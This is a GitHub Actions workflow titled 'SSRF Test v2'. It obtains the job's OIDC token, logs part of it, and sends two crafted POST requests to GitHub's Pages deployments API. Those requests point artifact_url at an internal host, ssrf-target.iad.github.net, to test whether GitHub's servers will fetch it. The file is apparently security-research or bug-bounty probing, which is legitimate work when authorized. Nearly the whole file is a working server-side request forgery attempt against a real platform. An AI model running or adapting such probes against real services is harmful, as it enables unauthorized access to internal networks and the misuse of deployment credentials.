name: SSRF Test v2
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
  pages: write

jobs:
  ssrf-test:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    steps:
    - name: Get OIDC Token and Test Pages Deployment SSRF
      id: deployment
      run: |
        # Get OIDC token
        OIDC_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
          "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api.github.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
        echo "Got OIDC token (first 20 chars): ${OIDC_TOKEN:0:20}..."
        
        # Test 1: artifact_url with ssrf-target
        echo "=== Test 1: SSRF via artifact_url ==="
        RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
          -X POST \
          -H "Authorization: Bearer $GITHUB_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          -H "Content-Type: application/json" \
          "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments" \
          -d "{
            \"artifact_url\": \"http://ssrf-target.iad.github.net/\",
            \"pages_build_version\": \"ssrf-test-$(date +%s)\",
            \"oidc_token\": \"$OIDC_TOKEN\"
          }")
        echo "Response: $RESPONSE"
        
        # Test 2: Try with different ssrf URL
        echo "=== Test 2: SSRF via artifact_url variant ==="
        RESPONSE2=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
          -X POST \
          -H "Authorization: Bearer $GITHUB_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          -H "Content-Type: application/json" \
          "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments" \
          -d "{
            \"artifact_url\": \"http://ssrf-target.iad.github.net:8080/\",
            \"pages_build_version\": \"ssrf-test2-$(date +%s)\",
            \"oidc_token\": \"$OIDC_TOKEN\"
          }")
        echo "Response2: $RESPONSE2"
